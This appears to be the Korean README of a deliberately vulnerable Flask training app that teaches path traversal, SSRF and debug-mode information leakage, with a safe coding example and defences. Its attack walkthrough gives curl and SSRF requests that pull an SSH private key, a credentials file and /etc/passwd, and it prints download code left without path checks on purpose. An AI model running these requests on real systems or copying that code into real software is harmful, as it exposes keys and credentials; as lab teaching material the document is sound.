# OWASP Top 10 - 취약한 백업 파일 서비스

웹 해킹 학습용 취약한 Flask 애플리케이션입니다. **절대 실제 운영 환경에서 사용하지 마세요.**

## 🎯 학습 목표

이 서비스는 다음 OWASP Top 10 취약점을 학습하기 위해 설계되었습니다:

- **A01:2021 - Broken Access Control** (Path Traversal)
- **A10:2021 - Server-Side Request Forgery (SSRF)**
- **취약한 정보 노출** (Debug mode, Internal paths)

## 🚀 실행 방법

### systemd 서비스로 등록 (권장 - Linux VM)

```bash
# 설치 스크립트 실행
chmod +x setup.sh
./setup.sh

# 서비스 시작
sudo systemctl start owasp-fileservice

# 서비스 상태 확인
sudo systemctl status owasp-fileservice

# 부팅 시 자동 시작
sudo systemctl enable owasp-fileservice

# 로그 확인
sudo journalctl -u owasp-fileservice -f
```

서비스는 `http://0.0.0.0:8080`에서 실행됩니다.

### 직접 실행 (개발용)

```bash
# 의존성 설치
pip3 install -r requirements.txt

# Flask 앱 실행
python3 app.py
```

## 📍 엔드포인트

### GET `/`
- 메인 페이지
- 서비스 정보 및 사용 가능한 엔드포인트 표시

### GET `/upload`
- **취약점**: 에러 메시지에서 내부 경로 노출
- 항상 500 에러를 반환하며, 디버그 정보에 `/opt/backup/uploads/` 경로가 노출됨

### GET `/download?path=<filepath>`
- **취약점**: Path Traversal (경로 검증 없음)
- 임의의 파일 다운로드 가능
- 예시: `/download?path=/opt/backup/uploads/keys/owasp10`

## 🔓 공격 시나리오

### 1단계: 정보 수집
```bash
# 메인 페이지 확인
curl http://localhost:8080/

# 업로드 엔드포인트 접근하여 내부 경로 유출
curl http://localhost:8080/upload
```

**발견**: `/opt/backup/uploads/` 경로 노출

### 2단계: Path Traversal 공격
```bash
# 프로젝트 내 파일 구조 확인 (에러 메시지에서 유출된 경로 사용)
# 예: D:\Projects\owasp10\owasp_fileservice\backup\uploads\ (Windows)
# 예: /home/user/owasp_fileservice/backup/uploads/ (Linux)

# 개인키 다운로드 (절대 경로 사용)
curl "http://localhost:8080/download?path=/home/user/owasp_fileservice/backup/uploads/keys/owasp10" -o owasp10.key

# 설정 파일 탈취
curl "http://localhost:8080/download?path=/home/user/owasp_fileservice/backup/uploads/configs/database.conf"

# 시스템 파일 접근 시도 (Linux)
curl "http://localhost:8080/download?path=/etc/passwd"
```

### 3단계: SSRF와 결합
SSRF 취약점이 있는 다른 서비스(예: VMware 내 80포트 `/admin` 페이지)에서:

```bash
# SSRF를 통해 내부 파일 서비스 접근
POST http://vulnerable-admin/check
{
  "url": "http://fileservice:8080/upload"
}

# 응답에서 내부 경로 확인 (예: /home/user/owasp_fileservice/backup/uploads/)

# 경로 정보 확인 후 개인키 탈취
POST http://vulnerable-admin/check
{
  "url": "http://fileservice:8080/download?path=/home/user/owasp_fileservice/backup/uploads/keys/owasp10"
}
```

**시나리오**: 
1. VMware 내 80포트에서 실행되는 `/admin` 페이지에 SSRF 취약점 존재
2. SSRF를 이용해 내부 네트워크의 파일 서비스(8080) `/upload`에 접근
3. 에러 응답에서 내부 저장소 경로 획득
4. `/download` 엔드포인트로 `owasp10` SSH 개인키 탈취

## 🗂️ 프로젝트 구조

```
owasp_fileservice/
├── app.py                   # Flask 애플리케이션
├── requirements.txt         # Python 의존성
├── setup.sh                 # systemd 설치 스크립트
├── templates/               # HTML 템플릿
│   ├── index.html
│   ├── upload_error.html
│   └── download.html
└── backup/uploads/          # 백업 파일 저장소
    ├── keys/
    │   └── owasp10          # SSH 개인키 (학습용)
    ├── configs/
    │   └── database.conf    # DB 설정 (자격증명 포함)
    └── data/
        └── backup.log       # 백업 로그
```

**중요**: SSH 개인키는 `backup/uploads/keys/` 디렉토리에 저장됩니다.

## ⚠️ 취약점 상세 분석

### 1. Path Traversal (A01 - Broken Access Control)

**위치**: `/download` 엔드포인트

```python
# 취약한 코드
path = request.args.get('path', '')
if os.path.exists(path):
    return send_file(path, as_attachment=True)
```

**문제점**:
- 사용자 입력에 대한 검증이 전혀 없음
- 절대 경로 및 상대 경로(`../`) 모두 허용
- 시스템의 모든 파일에 접근 가능

**안전한 코드 예시**:
```python
import os
from pathlib import Path

ALLOWED_DIR = "/opt/backup/uploads/"

def safe_download(user_path):
    # 절대 경로로 변환
    abs_path = os.path.abspath(os.path.join(ALLOWED_DIR, user_path))
    
    # 허용된 디렉토리 내부인지 확인
    if not abs_path.startswith(os.path.abspath(ALLOWED_DIR)):
        return "Access denied", 403
    
    if os.path.isfile(abs_path):
        return send_file(abs_path, as_attachment=True)
```

### 2. 정보 노출 (A05 - Security Misconfiguration)

**위치**: `/upload` 엔드포인트

**문제점**:
- `debug=True` 모드로 실행
- 상세한 스택 트레이스 노출
- 내부 파일 경로 노출
- 시스템 구조 정보 유출

**해결 방법**:
- 운영 환경에서는 `debug=False` 사용
- 사용자 친화적인 일반적인 에러 메시지 사용
- 민감한 정보를 로그에만 기록

### 3. SSRF 취약점 악용

다른 서비스의 SSRF 취약점과 결합하여:
- 내부 네트워크의 파일 서비스 접근
- 외부에서 직접 접근할 수 없는 리소스 탈취
- 인증 우회

## 🛡️ 방어 방법

1. **입력 검증**: 모든 사용자 입력을 검증하고 화이트리스트 방식 사용
2. **경로 정규화**: `os.path.realpath()`, `os.path.abspath()` 사용
3. **디렉토리 제한**: 허용된 디렉토리 내부인지 확인
4. **디버그 모드 비활성화**: 운영 환경에서는 절대 debug=True 사용 금지
5. **에러 처리**: 상세한 에러 정보를 사용자에게 노출하지 않음
6. **최소 권한 원칙**: 애플리케이션을 최소 권한으로 실행

## 📚 참고 자료

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP SSRF](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)

## ⚖️ 면책 조항

이 애플리케이션은 **오직 교육 목적**으로만 제작되었습니다. 의도적으로 취약점이 포함되어 있으며, 실제 운영 환경에서는 절대 사용해서는 안 됩니다. 무단으로 타인의 시스템을 공격하는 것은 불법입니다.

## 📝 라이센스

MIT License - 학습 및 교육 목적으로 자유롭게 사용 가능합니다.

